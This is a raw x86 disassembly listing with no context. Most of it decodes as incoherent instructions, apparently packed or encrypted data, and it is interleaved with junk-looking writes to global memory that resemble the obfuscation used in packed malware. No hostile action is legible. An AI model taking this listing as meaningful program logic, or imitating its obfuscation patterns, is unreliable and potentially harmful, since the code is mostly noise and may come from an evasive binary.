  40484b:	fisttp QWORD PTR [esi+0x7f652044]
  404851:	pop    DWORD PTR ds:[edx]
  404854:	shl    DWORD PTR [esi-0x22baacfd],cl
  40485a:	mov    BYTE PTR [ecx],0xdb
  40485d:	pop    esp
  40485e:	rcl    DWORD PTR [ecx],1
  404860:	jns    0x404800
  404862:	mov    dh,0x43
  404864:	daa    
  404865:	add    eax,0x12216723
  40486a:	fstp   TBYTE PTR [esi]
  40486c:	dec    edi
  40486d:	loopne 0x40483c
  40486f:	xchg   esp,eax
  404870:	mov    bh,0xdf
  404872:	or     DWORD PTR [ebx-0x24],edx
  404875:	push   edx
  404876:	lods   eax,DWORD PTR cs:[esi]
  404878:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404879:	hlt    
  40487a:	dec    ecx
  40487b:	jno    0x4048b0
  40487d:	test   dl,0x88
  404880:	cli    
  404881:	popf   
  404882:	inc    edx
  404883:	dec    esp
  404884:	enter  0x7886,0x2f
  404888:	adc    al,0xf6
  40488a:	aas    
  40488b:	xor    cl,dl
  40488d:	rcr    edx,0x16
  404890:	adc    DWORD PTR [esi-0x57cd047a],edx
  404896:	daa    
  404897:	fs pop esp
  404899:	xchg   ebp,eax
  40489a:	in     al,dx
  40489b:	rcr    al,1
  40489d:	mov    bl,0x5f
  40489f:	bound  edi,QWORD PTR [ebx+0x63a747e7]
  4048a5:	add    ebx,DWORD PTR [eax]
  4048a7:	cld    
  4048a8:	pop    ebp
  4048a9:	fbstp  TBYTE PTR [edi-0x6b]
  4048ac:	mov    bh,0xc
  4048ae:	jmp    0x1f12:0xe72bd0a4
  4048b5:	(bad)  
  4048b6:	xchg   ebp,eax
  4048b7:	pop    edi
  4048b8:	popf   
  4048b9:	lods   eax,DWORD PTR ds:[esi]
  4048ba:	jecxz  0x404877
  4048bc:	retf   0x3998
  4048bf:	repnz push ebp
  4048c1:	jg     0x404874
  4048c3:	adc    DWORD PTR [ebx-0x13],edx
  4048c6:	cld    
  4048c7:	(bad)  
  4048c9:	les    ecx,FWORD PTR [edi-0x24aa336f]
  4048cf:	inc    eax
  4048d0:	std    
  4048d1:	mov    cl,0xcc
  4048d3:	sub    BYTE PTR [edx-0x71699551],al
  4048d9:	retf   
  4048da:	call   0xa9407b37
  4048df:	push   ds
  4048e0:	sub    dl,BYTE PTR [ebx]
  4048e2:	sahf   
  4048e3:	adc    ah,dl
  4048e5:	mov    esp,0x1b449391
  4048ea:	sbb    eax,0x22f218d4
  4048ef:	imul   esi,DWORD PTR [ebp+0x42],0x17
  4048f3:	mov    eax,ecx
  4048f5:	mov    eax,0x99adea5c
  4048fa:	jmp    0x9895c565
  4048ff:	fcmovnb st,st(2)
  404901:	out    dx,eax
  404902:	pop    eax
  404903:	cmp    al,0x2a
  404905:	es stos BYTE PTR es:[edi],al
  404907:	mov    edx,0x7fe11409
  40490c:	jae    0x404933
  40490e:	push   esi
  40490f:	mov    ah,0x36
  404911:	stos   BYTE PTR es:[edi],al
  404912:	addr16 dec ecx
  404914:	ficomp WORD PTR [ebx+ebx*2-0x8]
  404918:	sti    
  404919:	in     eax,dx
  40491a:	cs xchg ecx,eax
  40491c:	clc    
  40491d:	push   0xffffff96
  40491f:	xlat   BYTE PTR ds:[ebx]
  404920:	and    BYTE PTR [ecx],bh
  404922:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404923:	sbb    eax,0xd8dc45c7
  404928:	test   DWORD PTR [eax+edi*8-0x7e0bba75],ebx
  40492f:	sbb    eax,0x417e59
  404934:	push   ecx
  404935:	jle    0x404978
  404937:	add    BYTE PTR [ebx],dh
  404939:	mov    BYTE PTR [ecx+0x41abde2d],0x0
  404940:	retf   
  404941:	xor    eax,0x74e90042
  404946:	add    DWORD PTR [eax],eax
  404948:	add    ch,bl
  40494a:	adc    ebx,DWORD PTR [ecx+0x557959e1]
  404950:	and    eax,esi
  404952:	scas   al,BYTE PTR es:[edi]
  404953:	pop    ss
  404954:	addr16 es push es
  404957:	add    BYTE PTR [edx+ebx*8-0x25818181],0x7f
  40495f:	jle    0x4049df
  404961:	add    eax,0xf896baa
  404966:	arpl   WORD PTR [edi],bx
  404968:	test   eax,0x60f7fbf
  40496d:	ja     0x4049ca
  40496f:	mov    ds:0xad340644,eax
  404974:	mov    eax,ds:0x50a8967e
  404979:	adc    DWORD PTR [edi+0x577b8c81],eax
  40497f:	mov    BYTE PTR [edi+0x7],al
  404982:	pop    esi
  404983:	in     eax,dx
  404984:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404985:	push   0x27
  404987:	(bad)  
  404988:	les    edx,FWORD PTR [edx+0x1e]
  40498b:	int3   
  40498c:	inc    ecx
  40498d:	int3   
  40498e:	fs loope 0x4049ca
  404991:	div    DWORD PTR [edi]
  404993:	std    
  404994:	loop   0x404958
  404996:	aam    0xc5
  404998:	and    ebp,DWORD PTR [eax]
  40499a:	dec    esi
  40499b:	fimul  WORD PTR [esi]
  40499d:	and    BYTE PTR [eax-0x34],al
  4049a0:	aaa    
  4049a1:	adc    DWORD PTR [ecx+0x1],edx
  4049a4:	mov    dh,bh
  4049a6:	xor    bh,bl
  4049a8:	sbb    DWORD PTR [esi+0x39],esp
  4049ab:	ret    0x145d
  4049ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049af:	jl     0x404a21
  4049b1:	in     eax,dx
  4049b2:	inc    esi
  4049b3:	push   esi
  4049b4:	xchg   ecx,eax
  4049b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049b6:	loopne 0x40494c
  4049b8:	sub    DWORD PTR [esi+0x42],eax
  4049bb:	xor    bh,ah
  4049bd:	retf   0x5208
  4049c0:	pop    esp
  4049c1:	adc    BYTE PTR [ebx+edx*2+0x70],bl
  4049c5:	outs   dx,DWORD PTR ds:[esi]
  4049c6:	scas   eax,DWORD PTR es:[edi]
  4049c7:	sub    eax,0x3c662b87
  4049cc:	jo     0x404a3e
  4049ce:	repz in eax,0xe0
  4049d1:	out    0x5f,eax
  4049d3:	mov    ebx,0xbc79a4d7
  4049d8:	xor    BYTE PTR [ecx],cl
  4049da:	lock cli 
  4049dc:	in     al,dx
  4049dd:	mov    eax,0xbf4305d1
  4049e2:	shr    BYTE PTR [edi+0x32422f07],cl
  4049e8:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4049ea:	bnd jmp ebp
  4049ed:	mov    edi,0x766254b1
  4049f2:	jge    0x4049c6
  4049f4:	xchg   esi,eax
  4049f5:	pop    es
  4049f6:	adc    edi,eax
  4049f8:	out    0x6c,eax
  4049fa:	jbe    0x4049c5
  4049fc:	(bad)  
  4049fe:	fld    st(7)
  404a00:	popf   
  404a01:	(bad)  
  404a02:	retf   0xaf8f
  404a05:	cmp    DWORD PTR [ebx],eax
  404a07:	cmp    esp,DWORD PTR [edx+0x6e]
  404a0a:	cld    
  404a0b:	mov    dl,0x8c
  404a0d:	push   ss
  404a0e:	xchg   edx,eax
  404a0f:	push   ebx
  404a10:	clc    
  404a11:	sbb    cl,dl
  404a13:	es jb  0x404a4a
  404a16:	jne    0x404a1d
  404a18:	xchg   ebp,eax
  404a19:	out    dx,al
  404a1a:	mov    esi,0x90742d4
  404a1f:	sbb    esp,DWORD PTR [ebx+0x68110efd]
  404a25:	jo     0x404a70
  404a27:	mov    bh,0xda
  404a29:	pop    ds
  404a2a:	push   ss
  404a2b:	mov    dh,0x1b
  404a2d:	cld    
  404a2e:	fnstsw WORD PTR [eax]
  404a30:	push   esp
  404a31:	fdivr  DWORD PTR [esi+edx*1]
  404a34:	sbb    ch,BYTE PTR [ecx+0x3]
  404a37:	xchg   ebp,eax
  404a38:	sti    
  404a39:	stc    
  404a3a:	xor    bl,al
  404a3c:	xchg   esi,eax
  404a3d:	add    dh,BYTE PTR [edx-0x5d]
  404a40:	call   0x1c80:0xc8fbee79
  404a47:	and    bh,0x98
  404a4a:	out    0x89,eax
  404a4c:	adc    al,0xc0
  404a4e:	jns    0x404a81
  404a50:	lods   eax,DWORD PTR ds:[esi]
  404a51:	ret    0xb682
  404a54:	in     eax,dx
  404a55:	inc    ecx
  404a56:	ret    0x74c9
  404a59:	dec    edx
  404a5a:	inc    esp
  404a5b:	pop    ds
  404a5c:	inc    eax
  404a5d:	cmp    DWORD PTR [ebx-0x5d],0x5794af40
  404a64:	sbb    DWORD PTR [ebp-0x36],ebp
  404a67:	js     0x404a9d
  404a69:	push   0x6d5e990f
  404a6e:	sbb    al,0x65
  404a70:	sbb    edx,DWORD PTR [ecx-0xa]
  404a73:	or     dl,BYTE PTR [ebp-0x7fcd0776]
  404a79:	xchg   DWORD PTR [edi+0x61badfd],ebx
  404a7f:	inc    edi
  404a80:	in     al,0x55
  404a82:	dec    esp
  404a83:	pop    ebx
  404a84:	jmp    0x63fb:0xf5bb4b9b
  404a8b:	jnp    0x404a3c
  404a8d:	outs   dx,DWORD PTR ds:[esi]
  404a8e:	sbb    ecx,DWORD PTR [eax+0x9]
  404a91:	xchg   esi,eax
  404a92:	xor    DWORD PTR ds:0xbe823f61,edx
  404a98:	add    ecx,esi
  404a9a:	stc    
  404a9b:	daa    
  404a9c:	adc    BYTE PTR [eax+0x44],bh
  404a9f:	ror    BYTE PTR [ecx],cl
  404aa1:	xor    esp,DWORD PTR [esi]
  404aa3:	add    al,0x77
  404aa5:	or     BYTE PTR [esi+0x1d],cl
  404aa8:	stc    
  404aa9:	dec    eax
  404aaa:	add    eax,0xabd0bd26
  404aaf:	aas    
  404ab0:	lahf   
  404ab1:	retf   0x5974
  404ab4:	iret   
  404ab5:	xor    al,0x46
  404ab7:	test   BYTE PTR [edi],dl
  404ab9:	jle    0x404a45
  404abb:	mov    cl,0xa1
  404abd:	add    eax,edi
  404abf:	mov    DWORD PTR [ebp-0x18],eax
  404ac2:	and    DWORD PTR ds:0x4235cb,0x0
  404acc:	jmp    0x404adc
  404ad1:	mov    eax,ds:0x4235cb
  404ad6:	inc    eax
  404ad7:	mov    ds:0x4235cb,eax
  404adc:	cmp    DWORD PTR ds:0x4235cb,0x1e
  404ae3:	jae    0x404b28
  404ae9:	cmp    DWORD PTR ds:0x4235cb,0x6
  404af0:	jne    0x404b01
  404af6:	push   0x41ae97
  404afb:	call   DWORD PTR ds:0x40d1c4
  404b01:	cmp    DWORD PTR ds:0x4235cb,0x5
  404b08:	jne    0x404b19
  404b0e:	mov    eax,ds:0x4235cb
  404b13:	inc    eax
  404b14:	mov    ds:0x4235cb,eax
  404b19:	jmp    0x404ad1
  404b1e:	sub    DWORD PTR ds:0x415111,0xc33
  404b28:	mov    DWORD PTR [ebp-0x1c],0xf89c853f
  404b2f:	mov    BYTE PTR [ebp-0x1],0x57
  404b33:	sub    DWORD PTR ds:0x417e59,edi
  404b39:	mov    eax,DWORD PTR [ebp-0xc]
  404b3c:	xor    eax,esi
  404b3e:	and    DWORD PTR ds:0x415115,0x5145
  404b48:	add    eax,edi
  404b4a:	mov    DWORD PTR [ebp-0x18],eax
  404b4d:	mov    eax,DWORD PTR [ebp-0x24]
  404b50:	xor    eax,esi
  404b52:	adc    DWORD PTR ds:0x41abde,0x3f71
  404b5c:	add    eax,edi
  404b5e:	and    DWORD PTR ds:0x4235cf,0x352e
  404b68:	push   eax
  404b69:	dec    eax
  404b6a:	mov    eax,DWORD PTR [ebp-0x28]
  404b6d:	xor    eax,esi
  404b6f:	and    DWORD PTR ds:0x4235c3,0x41abce
  404b79:	add    eax,edi
  404b7b:	xor    DWORD PTR ds:0x41abda,0x41237c
  404b85:	push   eax
  404b86:	and    DWORD PTR ds:0x4235cf,0x41abe2
  404b90:	mov    eax,DWORD PTR [ebp-0x1c]
  404b93:	jmp    0x404d0c
  404b98:	push   0xffffff9c
  404b9a:	mov    ds:0x7b617853,al
  404b9f:	xchg   ebp,eax
  404ba0:	push   ebx
  404ba1:	mov    DWORD PTR [ecx+0x3f],esp
  404ba4:	loope  0x404bbf
  404ba6:	push   0x7e7ca611
  404bab:	jle    0x404b87
  404bad:	jg     0x404c2d
  404baf:	jle    0x404b43
  404bb1:	out    0xf9,eax
  404bb3:	jle    0x404c16
  404bb5:	daa    
  404bb6:	pop    edx
  404bb7:	sti    
  404bb8:	dec    edx
  404bb9:	pop    ebp
  404bba:	mov    edx,edi
  404bbc:	mov    ds:0x5f719f2f,al
  404bc1:	mov    DWORD PTR [edi-0x5c],esp
  404bc4:	push   edx
  404bc5:	out    dx,al
  404bc6:	mov    eax,ds:0xffd20849
  404bcb:	out    0xa1,al
  404bcd:	or     al,0x7f
  404bcf:	in     eax,0x89
  404bd1:	(bad)  
  404bd2:	out    0x13,al
  404bd4:	arpl   dx,di
  404bd6:	out    dx,al
  404bd7:	pop    ds
  404bd8:	or     dh,bl
  404bda:	clc    
  404bdb:	out    0xd5,al
  404bdd:	fucomp st(4)
  404bdf:	sbb    eax,edx
  404be1:	bound  ebx,QWORD PTR [ebx]
  404be3:	fwait
  404be4:	call   0x4d52:0x2be28a83
  404beb:	les    ebp,FWORD PTR [esp+eiz*4+0x72]
  404bef:	ins    DWORD PTR es:[edi],dx
  404bf0:	xchg   ebp,eax
  404bf1:	xor    DWORD PTR [ecx+ebp*1+0x105becd9],edx
  404bf8:	cmp    eax,0x9f3e5b7e
  404bfd:	enter  0x9de4,0xa8
  404c01:	fistp  QWORD PTR [edx]
  404c03:	jne    0x404c3f
  404c05:	adc    esi,DWORD PTR [ebp+eiz*8+0x9]
  404c09:	aad    0x47
  404c0b:	or     esi,esp
  404c0d:	cmp    eax,ebx
  404c0f:	leave  
  404c10:	pop    es
  404c11:	sti    
  404c12:	sbb    bl,cl
  404c14:	push   ss
  404c15:	xchg   ecx,eax
  404c16:	gs pushf 
  404c18:	fnstenv [ebp+esi*4+0x41735bc0]
  404c1f:	dec    ebp
  404c20:	push   cs
  404c21:	add    al,0xaf
  404c23:	sahf   
  404c24:	mov    es,WORD PTR ds:0xf11cbab2
  404c2a:	mov    DWORD PTR [ebx-0x571757e5],edi
  404c30:	mov    WORD PTR [ecx],fs
  404c32:	stos   DWORD PTR es:[edi],eax
  404c33:	push   edx
  404c34:	mov    ds:0x69ed67bf,eax
  404c39:	mov    esi,0x5249ebd2
  404c3e:	out    dx,eax
  404c3f:	cmp    eax,0x1fff58d0
  404c44:	fs adc eax,0x6a88cd8f
  404c4a:	mov    ebp,0xa1b6ce42
  404c4f:	out    dx,eax
  404c50:	mov    al,0xec
  404c52:	imul   ebp,DWORD PTR [esi-0x7529c8ed],0x53
  404c59:	inc    ecx
  404c5a:	and    eax,0x2d3a7e55
  404c5f:	int3   
  404c60:	fwait
  404c61:	mov    eax,ds:0x78dc23a6
  404c66:	adc    al,0x36
  404c68:	jmp    0x404c8c
  404c6a:	cdq    
  404c6b:	mov    edi,DWORD PTR [ebx+0x4aeb7767]
  404c71:	in     eax,dx
  404c72:	(bad)
  404c75:	push   ebp
  404c76:	push   ebp
  404c77:	adc    eax,0x84021d
  404c7c:	or     eax,0xdc7db7d8
  404c81:	popa   
  404c82:	and    al,0x3e
  404c84:	push   ebp
  404c85:	mov    eax,ds:0xc814a33f
  404c8a:	push   cs
  404c8b:	and    eax,DWORD PTR [ebx-0x4dc8f35a]
  404c91:	jmp    0x404d11
  404c93:	mov    dl,0x93
  404c95:	pop    ss
  404c96:	and    al,0x9e
  404c98:	pop    esi
  404c99:	adc    al,0xf1
  404c9b:	stc    
  404c9c:	(bad)  
  404c9d:	fucomp st(5)
  404c9f:	and    al,0xe0
  404ca1:	inc    eax
  404ca2:	xor    esp,DWORD PTR [edx-0x24]
  404ca5:	shl    DWORD PTR [edx+0x3f],cl
  404ca8:	jns    0x404c64
  404caa:	leave  
  404cab:	push   0x5dcd00ed
  404cb0:	js     0x404d12
  404cb2:	fwait
  404cb3:	push   edx
  404cb4:	je     0x404c57
  404cb6:	mov    esi,ebp
  404cb8:	ds (bad) 
  404cba:	xchg   ebx,eax
  404cbb:	(bad)  [ebx-0x34]
  404cbe:	test   BYTE PTR [ecx+ecx*8+0x4183d4e8],dl
  404cc5:	add    esp,DWORD PTR [edi]
  404cc7:	and    BYTE PTR [edx+0x1c0eb840],cl
  404ccd:	mov    fs,WORD PTR [esi]
  404ccf:	jmp    0x404d0a
  404cd1:	cwde   
  404cd2:	mov    dh,0x52
  404cd4:	cmp    DWORD PTR [edx-0x5e],eax
  404cd7:	test   BYTE PTR [ecx],bh
  404cd9:	or     edi,DWORD PTR [esi-0x9d91522]
  404cdf:	sbb    eax,ebp
  404ce1:	dec    ebx
  404ce2:	jmp    FWORD PTR [ecx-0x11]
  404ce5:	sub    dh,cl
  404ce7:	stos   BYTE PTR es:[edi],al
  404ce8:	bound  esp,QWORD PTR [eax+eax*2]
  404ceb:	ja     0x404cbd
  404ced:	sbb    al,0xf1
  404cf0:	(bad)  
  404cf1:	imul   DWORD PTR [edi]
  404cf3:	stos   BYTE PTR es:[edi],al
  404cf4:	pop    eax
  404cf5:	xor    eax,0x8fb07155
  404cfa:	pop    edx
  404cfb:	lahf   
  404cfc:	outs   dx,BYTE PTR ds:[esi]
  404cfd:	dec    edi
  404cfe:	jp     0x404d56
  404d00:	fistp  QWORD PTR [edx+0x35cb1d1d]
  404d06:	add    ch,BYTE PTR [ecx-0x16f3ea8c]
  404d0c:	xor    eax,esi
  404d0e:	neg    DWORD PTR ds:0x415105
  404d14:	add    eax,edi
  404d16:	xor    DWORD PTR ds:0x412364,0x39b1
  404d20:	push   eax
  404d21:	lea    eax,[ebp-0x78]
  404d24:	push   eax
  404d25:	mov    DWORD PTR ds:0x41237c,0x6752
  404d2f:	push   DWORD PTR [ebp-0xc]
  404d32:	sub    DWORD PTR ds:0x415111,0x1b2b
  404d3c:	push   DWORD PTR [ebp-0x14]
  404d3f:	sub    DWORD PTR ds:0x4235c7,0x412364
  404d49:	call   0x409363
  404d4e:	inc    DWORD PTR ds:0x415119
  404d54:	test   eax,eax
  404d56:	mov    DWORD PTR ds:0x4235c7,0x71ec
  404d60:	je     0x404de0
  404d66:	sub    DWORD PTR ds:0x417e59,0x4235db
  404d70:	lea    eax,[ebp-0x78]
  404d73:	neg    DWORD PTR ds:0x4235cf
  404d79:	push   eax
  404d7a:	add    eax,DWORD PTR ds:0x4235db
  404d80:	mov    eax,DWORD PTR [ebp-0x14]
  404d83:	and    DWORD PTR ds:0x417e59,0xd95
  404d8d:	xor    eax,esi
  404d8f:	add    eax,edi
  404d91:	and    DWORD PTR ds:0x417e3d,0x71b6
  404d9b:	push   eax
  404d9c:	mov    eax,DWORD PTR [ebp-0x10]
  404d9f:	add    eax,0xaa
  404da4:	push   eax
  404da5:	and    DWORD PTR ds:0x41abd2,0x17f4
  404daf:	mov    eax,DWORD PTR [ebp-0x10]
  404db2:	sub    DWORD PTR ds:0x417e55,0x41236c
  404dbc:	mov    eax,DWORD PTR [eax+0x198]
  404dc2:	push   DWORD PTR [eax]
  404dc4:	add    DWORD PTR ds:0x417e55,0x417e3d
  404dce:	call   0x40ae4d
  404dd3:	mov    DWORD PTR ds:0x41abd6,0x35a
  404ddd:	mov    DWORD PTR [ebp-0x8],eax
  404de0:	mov    DWORD PTR ds:0x412368,0x764e
  404dea:	cmp    DWORD PTR [ebp-0x8],0x0
  404dee:	not    DWORD PTR ds:0x412364
  404df4:	lea    eax,[ebp+0x4]
  404df7:	mov    DWORD PTR [ebp-0x20],eax
  404dfa:	je     0x405842
  404e00:	lea    eax,[ebp-0x18]
  404e03:	jmp    0x404f7c
  404e08:	ja     0x404d8f
  404e0a:	(bad)  
  404e0b:	je     0x404d9a
  404e0d:	je     0x404d94
  404e0f:	test   DWORD PTR [esi],edi
  404e11:	push   ebx
  404e12:	outs   dx,DWORD PTR ds:[esi]
  404e13:	jne    0x404dd1
  404e15:	(bad)  
  404e17:	xlat   BYTE PTR ds:[ebx]
  404e18:	add    dh,BYTE PTR [edx+0x7e]
  404e1b:	jle    0x404df7
  404e1d:	jg     0x404e9d
  404e1f:	jle    0x404e56
  404e21:	jge    0x404e74
  404e23:	int3   
  404e24:	lods   eax,DWORD PTR ds:[esi]
  404e25:	loopne 0x404e70
  404e27:	in     al,dx
  404e28:	fild   DWORD PTR [ebx-0x52]
  404e2b:	imul   ebp,DWORD PTR [ecx],0x28b29b34
  404e31:	imul   cl
  404e33:	mov    esp,0x4c8be1
  404e38:	mov    esp,DWORD PTR [eax-0x4f82722]
  404e3e:	add    cl,BYTE PTR [edx]
  404e40:	stos   DWORD PTR es:[edi],eax
  404e41:	pop    ebp
  404e42:	push   0x5e
  404e44:	push   ss
  404e45:	inc    edi
  404e46:	test   eax,0x9a0b2f06
  404e4b:	int3   
  404e4c:	adc    eax,0x9bc54c3c
  404e51:	cld    
  404e52:	test   al,0x2a
  404e54:	(bad)  
  404e55:	scas   eax,DWORD PTR es:[edi]
  404e56:	dec    esp
  404e57:	dec    esp
  404e58:	leave  
  404e59:	je     0x404eb8
  404e5b:	add    DWORD PTR [eax],eax
  404e5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e5e:	push   esp
  404e5f:	jo     0x404e0c
  404e61:	push   esp
  404e62:	in     al,dx
  404e63:	and    al,0xc8
  404e65:	or     dh,ch
  404e67:	and    BYTE PTR [ecx-0x5be9b87d],dl
  404e6d:	mov    dh,0x95
  404e6f:	je     0x404ed0
  404e71:	push   edx
  404e72:	adc    DWORD PTR [ecx-0x5c531751],eax
  404e78:	(bad)  
  404e79:	out    0x20,al
  404e7b:	test   esi,0xd6d2bcce
  404e81:	or     DWORD PTR [edi+0x5b],ebp
  404e84:	div    ecx
  404e86:	jl     0x404e71
  404e88:	sub    BYTE PTR [edx+ecx*2+0x2ffa2576],al
  404e8f:	inc    edx
  404e90:	and    eax,0x46e76b9a
  404e95:	repz jcxz 0x404ed7
  404e99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e9a:	mov    esp,0x743f96ef
  404e9f:	xchg   edx,eax
  404ea0:	call   0x75b59f30
  404ea5:	shl    DWORD PTR [ebx-0x6f456a55],0xed
  404eac:	mov    dl,0x25
  404eae:	jl     0x404e9b
  404eb0:	ins    BYTE PTR es:[edi],dx
  404eb1:	ins    BYTE PTR es:[edi],dx
  404eb2:	pop    ss
  404eb3:	mov    cl,0x37
  404eb5:	push   0xc
  404eb7:	pop    ss
  404eb8:	dec    esp
  404eb9:	aam    0xec
  404ebb:	xor    edx,DWORD PTR [eax+0x54]
  404ebe:	fldcw  WORD PTR [edx+0x48]
  404ec1:	(bad)  
  404ec2:	jl     0x404f27
  404ec4:	gs retf 
  404ec6:	add    ebp,DWORD PTR [edi+0x19716f64]
  404ecc:	push   esi
  404ecd:	gs test eax,0x14201b77
  404ed3:	retf   
  404ed4:	nop
  404ed5:	popa   
  404ed6:	rol    DWORD PTR [edi-0x208ac603],1
  404edc:	sbb    eax,0x12163e72
  404ee1:	push   esp
  404ee2:	mov    ecx,0x7efa5385
  404ee7:	jne    0x404e88
  404ee9:	int    0xc4
  404eeb:	sbb    al,0x5a
  404eed:	ja     0x404eec
  404eef:	sbb    BYTE PTR [esi+0x2],ch
  404ef2:	test   al,0x8d
  404ef4:	or     al,BYTE PTR [ebp+0x74]
  404ef7:	pop    edi
  404ef8:	pop    eax
  404ef9:	xchg   esi,eax
  404efa:	fsubr  DWORD PTR [edx-0x3e]
  404efd:	push   ebx
  404efe:	sub    BYTE PTR [ebx],dh
  404f00:	xchg   ecx,eax
  404f01:	jl     0x404ea7
  404f03:	push   0xffffffc4
  404f05:	stos   DWORD PTR es:[edi],eax
  404f06:	adc    dh,BYTE PTR [ebp-0x3b]
  404f09:	fdivr  DWORD PTR [eax+ebx*1]
  404f0c:	cmp    al,0x5b
  404f0e:	inc    esi
  404f0f:	xchg   ebx,eax
  404f10:	xor    cl,dh
  404f12:	fist   WORD PTR [edi+ecx*8+0x52]
  404f16:	std    
  404f17:	jge    0x404eb3
  404f19:	mov    BYTE PTR [ebx+0x48538cdd],al
  404f1f:	mov    eax,ds:0x7e0d3a8c
  404f24:	adc    ebx,DWORD PTR [ecx+0x566fea54]
  404f2a:	pop    esp
  404f2b:	mov    esi,0x8c75c8c5
  404f30:	sti    
  404f31:	xchg   edx,eax
  404f32:	or     ch,BYTE PTR [edx]
  404f34:	in     al,dx
  404f35:	sbb    al,0x88
  404f37:	retf   0xc361
  404f3a:	aad    0xeb
  404f3c:	xchg   BYTE PTR [esi-0x6f5aa855],al
  404f42:	stos   DWORD PTR es:[edi],eax
  404f43:	jbe    0x404ed8
  404f45:	lahf   
  404f46:	fs out 0xad,al
  404f49:	and    eax,0x7f999ba9
  404f4e:	fcomp  QWORD PTR [edi]
  404f50:	or     DWORD PTR [esi],0x26
  404f53:	inc    esi
  404f54:	fsubr  DWORD PTR [ebx]
  404f56:	adc    al,bh
  404f58:	aad    0x20
  404f5a:	xlat   BYTE PTR ds:[ebx]
  404f5b:	ret    
  404f5c:	and    al,0x8f
  404f5e:	hlt    
  404f5f:	test   eax,0x4fe0b039
  404f64:	sub    BYTE PTR [esi-0x67e3b864],dl
  404f6a:	inc    eax
  404f6b:	lods   al,BYTE PTR ds:[esi]
  404f6c:	pushf  
  404f6d:	inc    ecx
  404f6e:	jmp    0x404fc3
  404f70:	dec    esp
  404f71:	dec    ecx
  404f72:	cld    
  404f73:	imul   ebx,DWORD PTR [edi-0x23],0x4dedcd65
  404f7a:	xor    al,0x43
  404f7c:	push   eax
  404f7d:	and    DWORD PTR ds:0x4235bf,0x0
  404f87:	jmp    0x404f97
  404f8c:	mov    eax,ds:0x4235bf
  404f91:	inc    eax
  404f92:	mov    ds:0x4235bf,eax
  404f97:	cmp    DWORD PTR ds:0x4235bf,0x1e
  404f9e:	jae    0x404fc0
  404fa4:	cmp    DWORD PTR ds:0x4235bf,0x22
  404fab:	jne    0x404fba
  404fb1:	push   DWORD PTR [ebp-0x28]
  404fb4:	call   DWORD PTR ds:0x40d298
  404fba:	jmp    0x404f8c
  404fbf:	inc    eax
  404fc0:	mov    eax,DWORD PTR [ebp-0x2c]
  404fc3:	adc    DWORD PTR ds:0x412354,0x412370
  404fcd:	xor    eax,esi
  404fcf:	add    eax,edi
  404fd1:	and    DWORD PTR ds:0x415115,0x3c83
  404fdb:	jmp    0x405154
  404fe0:	adc    al,0x10
  404fe2:	imul   DWORD PTR [edx]
  404fe4:	mov    ebp,DWORD PTR [ecx+0x1f8510a9]
  404fea:	and    DWORD PTR [edx+0x56418da6],esi
  404ff0:	out    dx,al
  404ff1:	jae    0x405071
  404ff3:	jle    0x404fcf
  404ff5:	jg     0x405075
  404ff7:	jle    0x404fa8
  404ff9:	jmp    0xee85:0xab7c4bd
  405000:	ss ds je 0x404ff2
  405004:	push   es
  405005:	test   DWORD PTR [ebp-0x6a8cde14],eax
  40500b:	scas   eax,DWORD PTR es:[edi]
  40500c:	jno    0x40507b
  40500e:	pop    ebx
  40500f:	rcl    BYTE PTR [ebx],0x39
  405012:	mov    dh,0xd6
  405014:	stos   BYTE PTR es:[edi],al
  405015:	fcomp  DWORD PTR [eax]
  405017:	mov    ds:0x91a2bed7,eax
  40501c:	xchg   ecx,eax
  40501d:	sbb    ch,BYTE PTR [ebx-0x50]
  405020:	hlt    
  405021:	sub    edx,DWORD PTR [eax-0x78d6bd3e]
  405027:	sbb    DWORD PTR [esi],ecx
  405029:	push   esi
  40502a:	clc    
  40502b:	test   DWORD PTR [ecx-0x43],ebp
  40502e:	push   ds
  40502f:	jns    0x40508e
  405031:	xchg   edi,eax
  405032:	call   0x263ba7b8
  405037:	nop
  405038:	fidiv  WORD PTR [ecx-0x7d293002]
  40503e:	outs   dx,DWORD PTR ds:[esi]
  40503f:	dec    esi
  405040:	es scas al,BYTE PTR es:[edi]
  405042:	jge    0x40506d
  405044:	or     eax,0x737b5958
  405049:	enter  0x3bca,0x60
  40504d:	leave  
  40504e:	pop    ds
  40504f:	ins    DWORD PTR es:[edi],dx
  405050:	xor    DWORD PTR [eax-0x7b],edi
  405053:	es cmps BYTE PTR fs:[esi],BYTE PTR es:[edi]
  405056:	fld    QWORD PTR [edi+0x16]
  405059:	shr    BYTE PTR [ebx],0x9b
  40505c:	test   DWORD PTR [ebx],0x474aea4a
  405062:	inc    esp
  405063:	bound  edx,QWORD PTR [edi+0x5f]
  405066:	sbb    esi,esi
  405068:	sti    
  405069:	inc    eax
  40506a:	sti    
  40506b:	jmp    0x8994:0x48924518
  405072:	sub    al,0xe4
  405074:	jns    0x405041
  405076:	fs imul edx,edx,0x6c
  40507a:	in     eax,dx
  40507b:	ss push esp
  40507d:	mov    BYTE PTR [eax-0x482c5a5d],ch
  405083:	test   al,0x21
  405085:	imul   ecx,DWORD PTR [eax+0x1f],0x1b
  405089:	sbb    edx,eax
  40508b:	vprotb xmm12,[esi+0x566a80ac],xmm0
  405094:	lods   eax,DWORD PTR ds:[esi]
  405095:	lds    esp,FWORD PTR [ebx-0x74]
  405098:	pop    ebp
  405099:	jmp    0x40503b
  40509b:	loop   0x405040
  40509d:	out    dx,eax
  40509e:	mov    dh,0x10
  4050a0:	mov    BYTE PTR [esi-0x8],al
  4050a3:	popf   
  4050a4:	inc    ecx
  4050a5:	dec    esp
  4050a6:	inc    eax
  4050a7:	out    0x45,eax
  4050a9:	je     0x405126
  4050ab:	ds ret 0x931a
  4050af:	xchg   ebx,eax
  4050b0:	das    
  4050b1:	push   edx
  4050b2:	adc    esp,DWORD PTR ds:0xf77a81f5
  4050b8:	add    dl,bl
  4050ba:	sbb    eax,0x6e86c382
  4050bf:	test   eax,0x1be4836
  4050c4:	or     al,0x4f
  4050c6:	mov    cl,0xbc
  4050c8:	xchg   DWORD PTR [edi-0x16],ebx
  4050cb:	cmp    cl,cl
